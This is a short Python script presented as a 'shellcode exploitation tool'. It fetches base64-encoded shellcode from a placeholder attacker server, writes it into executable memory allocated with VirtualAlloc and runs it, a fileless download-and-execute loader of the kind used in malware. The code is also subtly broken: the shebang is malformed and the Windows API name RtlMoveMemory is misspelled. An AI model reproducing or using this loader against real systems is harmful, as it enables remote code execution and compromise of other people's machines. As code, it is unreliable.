#!/bin/bash/env python

# Shellcode exploitation tool
# In order to execute shellcode without touching the file system, we need to create a buffer in memory to hold the shellcode

from urllib import request

import base64
import ctypes

kernel32 = ctypes.windll.kernel32

# This function retrieves the the base64-encoded shellcode from our Kali python3 server
def get_code(url):
    with request.urlopen(url)  as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

# This function writes the buffer in memory
def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t)
    
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtMoveMemory(ptr, buf, length)
    return ptr

def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)

    ptr = write_memory(buffer)

    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == '__main__':
    url = "http://Attacker's IP:Port/shelcode.bin"
    shellcode = get_code(url)
    run(shellcode)